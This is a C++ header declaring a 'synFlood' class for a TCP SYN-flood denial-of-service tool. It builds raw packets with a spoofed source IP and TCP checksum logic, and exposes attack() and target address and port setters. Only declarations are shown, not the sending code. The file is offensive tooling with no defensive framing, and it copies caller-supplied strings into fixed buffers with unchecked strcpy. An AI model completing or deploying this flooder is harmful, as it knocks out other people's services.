#pragma once

#include<sys/socket.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<arpa/inet.h>
#include<cstdlib>
#include<iostream>
#include<string>
#include<string.h>
#include <unistd.h>

class synFlood
{
public:
    synFlood():_port(80)
    {
        strcpy(_sourceip,"192.168.1.2");
        strcpy(_destip,"127.0.0.1");
        init();
        initSocket();
    }

    synFlood(const std::string& destip,unsigned int port):_port(port)
    {
        strcpy(_sourceip,"192.168.1.2");
        strcpy(_destip,destip.c_str());
        init();
        initSocket();
    }

    synFlood(const char* destip,unsigned int port):_port(port)
    {
        strcpy(_sourceip,"192.168.1.2");
        strcpy(_destip,destip);
        init();
        initSocket();
    }
    ~synFlood()
    {
        close(_sock_fd);
    }
public:
    void attack();
    unsigned short send();
    void setDestAddr(std::string &dest_addr)
    {
        setDest(dest_addr.c_str());
    }

    void setDestAddr(const char* dest_addr)
    {
        setDest(dest_addr);
    }

    void setPort(unsigned int port)
    {
        _port=port;
    }
private:
    struct pseudo_header
    {
        unsigned int sour_addr;//source ip
        unsigned int dest_addr;//destination ip
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_len;//length of tcp packet
        struct tcphdr tcph;
    };

    unsigned short checksum(unsigned short *ptr,int nbytes);// the sum of check
    
    void initSocket();
    void attackRun();
    unsigned short sendPacket();
    void setDest(const char* dest_addr);
private:
#define BUFF_SIZE 4096
    unsigned int randomId()
    {
        return (unsigned int)rand();
    }

    void init();
private:
    char _datagram[BUFF_SIZE];
    struct sockaddr_in _sin;
    int _sock_fd;
    char _sourceip[32];
    char _destip[32];
    unsigned int _port;
};
